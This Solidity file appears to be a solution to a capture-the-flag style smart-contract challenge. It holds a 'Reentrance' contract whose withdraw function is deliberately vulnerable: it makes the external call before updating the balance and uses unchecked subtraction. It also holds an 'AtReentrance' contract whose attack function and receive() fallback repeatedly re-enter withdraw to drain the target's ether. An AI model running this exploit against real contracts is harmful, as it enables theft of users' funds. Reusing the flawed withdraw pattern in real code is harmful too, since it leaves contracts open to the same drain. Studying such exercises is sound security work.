// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.3/contracts/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

contract AtReentrance {
    Reentrance ret;
    uint256 amount = 0.001 ether;

    constructor(Reentrance _ret) public {
        ret = _ret;
    }

    function attack() public payable {
        ret.donate{value: amount}(address(this));
        ret.withdraw(amount);
    }

    receive() external payable {
        if (address(ret).balance >= amount) {
            ret.withdraw(amount);
        }
    }
}
